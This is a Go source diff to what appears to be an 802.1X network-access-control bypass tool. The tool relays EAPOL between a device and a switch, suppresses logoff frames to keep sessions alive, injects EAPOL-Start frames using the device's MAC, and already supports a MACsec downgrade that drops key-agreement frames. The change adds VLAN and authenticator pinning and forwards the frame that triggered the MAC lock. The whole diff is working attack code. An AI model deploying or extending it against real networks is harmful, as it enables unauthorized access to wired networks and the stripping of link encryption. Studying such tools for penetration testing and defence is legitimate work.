@@ -29,10 +29,15 @@ type Relay struct {
 	session *AuthSession
 	logFunc func(string)
 
-	mu               sync.Mutex
-	suppressLogoff   bool
-	downgrader       *Downgrader
-	authSignal       chan AuthResult
+	mu             sync.Mutex
+	suppressLogoff bool
+	injectStart    bool
+	strictAuthMAC  bool
+	strictVLAN     bool
+	initialFrame   []byte
+	modeName       string
+	downgrader     *Downgrader
+	authSignal     chan AuthResult
 
 	// Log deduplication
 	lastReqMethod  EAPMethod
@@ -55,6 +60,10 @@ func NewRelay(ifaceA, ifaceB string, session *AuthSession, logFunc func(string))
 		session:        session,
 		logFunc:        logFunc,
 		suppressLogoff: true, // Default: suppress logoff to keep session alive
+		injectStart:    true, // Manual relay prompts the authenticator by default
+		strictAuthMAC:  true, // Manual relay pins authenticator direction once learned
+		strictVLAN:     true, // Manual relay pins VLAN once learned
+		modeName:       "EAPOL relay",
 		authSignal:     make(chan AuthResult, 8), // Buffered to avoid dropping re-auth results
 	}
 }
@@ -64,6 +73,46 @@ func (r *Relay) SetSuppressLogoff(suppress bool) {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 	r.suppressLogoff = suppress
+}
+
+// SetInjectStart controls whether the relay emits an EAPOL-Start after it is armed.
+func (r *Relay) SetInjectStart(enabled bool) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	r.injectStart = enabled
+}
+
+// SetStrictAuthenticator controls whether switch-side EAPOL must keep the first
+// observed authenticator source MAC. Transparent passthrough keeps this disabled
+// because stacks and some switches may source different EAPOL phases differently.
+func (r *Relay) SetStrictAuthenticator(enabled bool) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	r.strictAuthMAC = enabled
+}
+
+// SetStrictVLAN controls whether EAPOL is pinned to the first observed VLAN.
+func (r *Relay) SetStrictVLAN(enabled bool) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	r.strictVLAN = enabled
+}
+
+// SetInitialFrame queues the first device-side frame that triggered MAC lock for
+// forwarding after relay capture goroutines are armed.
+func (r *Relay) SetInitialFrame(frame []byte) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	r.initialFrame = append([]byte(nil), frame...)
+}
+
+// SetModeName changes the short name used in relay logs.
+func (r *Relay) SetModeName(name string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	if name != "" {
+		r.modeName = name
+	}
 }
 
 // EnableDowngrade activates MACsec downgrade (drops EAPOL-Key/MKA frames).
@@ -101,15 +150,10 @@ func (r *Relay) Start(ctx context.Context) error {
 		return fmt.Errorf("BPF filter on %s: %w", r.ifaceB, err)
 	}
 
-	r.logFunc(fmt.Sprintf("[RELAY] EAPOL relay active: %s (device) ⟷ %s (switch)", r.ifaceA, r.ifaceB))
-
-	// Inject an EAPOL-Start on the switch port to prompt the authenticator.
-	// Some switches won't send EAP-Request/Identity until they see EAPOL-Start.
-	if r.session.SupplicantMAC != nil {
-		if err := InjectEAPOLStart(r.ifaceB, r.session.SupplicantMAC, r.logFunc); err != nil {
-			r.logFunc(fmt.Sprintf("[!][802.1X] EAPOL-Start injection failed (non-fatal): %v", err))
-		}
-	}
+	r.mu.Lock()
+	modeName := r.modeName
+	r.mu.Unlock()
+	r.logFunc(fmt.Sprintf("[RELAY] %s active: %s (device) ⟷ %s (switch)", modeName, r.ifaceA, r.ifaceB))
 
 	// Launch two goroutines for bidirectional relay.
 	var wg sync.WaitGroup
@@ -126,6 +170,34 @@ func (r *Relay) Start(ctx context.Context) error {
 		defer wg.Done()
 		r.relayDirection(ctx, handleA, handleB, "device→switch")
 	}()
+
+	r.mu.Lock()
+	initialFrame := append([]byte(nil), r.initialFrame...)
+	injectStart := r.injectStart
+	r.mu.Unlock()
+
+	// Forward the frame that triggered MAC lock after capture goroutines are armed.
+	// In inline mode this avoids losing the first EAPOL-Start/DHCP/ARP packet while
+	// the switch-facing port was intentionally held down.
+	if len(initialFrame) > 0 {
+		if err := handleB.WritePacketData(initialFrame); err != nil {
+			r.logFunc(fmt.Sprintf("[RELAY] initial trigger frame injection error: %v", err))
+		} else {
+			r.logFunc("[RELAY] initial device frame forwarded to switch side")
+		}
+	}
+
+	// Manual relay can prompt the authenticator, but transparent passthrough disables
+	// this and only forwards frames that naturally appear on the wire.
+	if injectStart && r.session.SupplicantMAC != nil {
+		r.session.mu.Lock()
+		vlanID := r.session.VLANID
+		supplicantMAC := copyMAC(r.session.SupplicantMAC)
+		r.session.mu.Unlock()
+		if err := InjectEAPOLStartWithVLAN(r.ifaceB, supplicantMAC, vlanID, r.logFunc); err != nil {
+			r.logFunc(fmt.Sprintf("[!][802.1X] EAPOL-Start injection failed (non-fatal): %v", err))
+		}
+	}
 
 	wg.Wait()
 	return nil
@@ -160,6 +232,9 @@ func (r *Relay) relayDirection(ctx context.Context, src, dst *pcap.Handle, label
 				continue
 			}
 			eth, _ := ethLayer.(*layers.Ethernet)
+			if !r.acceptFrame(packet, eth, label) {
+				continue
+			}
 
 			eapolLayer := packet.Layer(layers.LayerTypeEAPOL)
 			if eapolLayer == nil {
@@ -204,8 +279,11 @@ func (r *Relay) relayDirection(ctx context.Context, src, dst *pcap.Handle, label
 					r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Logoff from %s — forwarding", label, eth.SrcMAC))
 				}
 
-			case layers.EAPOLTypeKey, layers.EAPOLType(5):
-				// Always track MACsec presence.
+			case layers.EAPOLTypeKey:
+				r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Key frame from %s — forwarding", label, eth.SrcMAC))
+
+			case layers.EAPOLType(5):
+				// EAPOL-MKA carries MACsec key agreement.
 				r.session.mu.Lock()
 				isFirstTime := !r.session.MACsecDetected
 				r.session.MACsecDetected = true
@@ -244,6 +322,58 @@ func (r *Relay) relayDirection(ctx context.Context, src, dst *pcap.Handle, label
 			}
 		}
 	}
+}
+
+func (r *Relay) acceptFrame(packet gopacket.Packet, eth *layers.Ethernet, label string) bool {
+	r.mu.Lock()
+	strictAuthMAC := r.strictAuthMAC
+	strictVLAN := r.strictVLAN
+	r.mu.Unlock()
+
+	r.session.mu.Lock()
+	defer r.session.mu.Unlock()
+
+	supplicantMAC := r.session.SupplicantMAC
+	if len(supplicantMAC) == 0 {
+		return false
+	}
+
+	switch label {
+	case "device→switch":
+		// Ignore reflected switch frames captured on the device-side handle.
+		if !macEqual(eth.SrcMAC, supplicantMAC) {
+			return false
+		}
+	case "switch→device":
+		// Ignore our own injected supplicant frames captured by the switch-side handle.
+		if macEqual(eth.SrcMAC, supplicantMAC) {
+			return false
+		}
+		if len(r.session.AuthenticatorMAC) == 0 && eth.SrcMAC[0]&1 == 0 {
+			r.session.AuthenticatorMAC = copyMAC(eth.SrcMAC)
+		}
+		if strictAuthMAC && len(r.session.AuthenticatorMAC) > 0 && !macEqual(eth.SrcMAC, r.session.AuthenticatorMAC) {
+			return false
+		}
+	default:
+		return false
+	}
+
+	if dot1qLayer := packet.Layer(layers.LayerTypeDot1Q); dot1qLayer != nil {
+		dot1q, _ := dot1qLayer.(*layers.Dot1Q)
+		if dot1q.VLANIdentifier != 0 {
+			if r.session.VLANID == 0 {
+				r.session.VLANID = dot1q.VLANIdentifier
+			} else if r.session.VLANID != dot1q.VLANIdentifier {
+				if !strictVLAN {
+					return true
+				}
+				return false
+			}
+		}
+	}
+
+	return true
 }
 
 // handleEAPFrame inspects an EAP frame inside an EAPOL packet.
@@ -362,4 +492,16 @@ func copyMAC(mac net.HardwareAddr) net.HardwareAddr {
 	dup := make(net.HardwareAddr, len(mac))
 	copy(dup, mac)
 	return dup
+}
+
+func macEqual(a, b net.HardwareAddr) bool {
+	if len(a) != len(b) {
+		return false
+	}
+	for i := range a {
+		if a[i] != b[i] {
+			return false
+		}
+	}
+	return true
 }
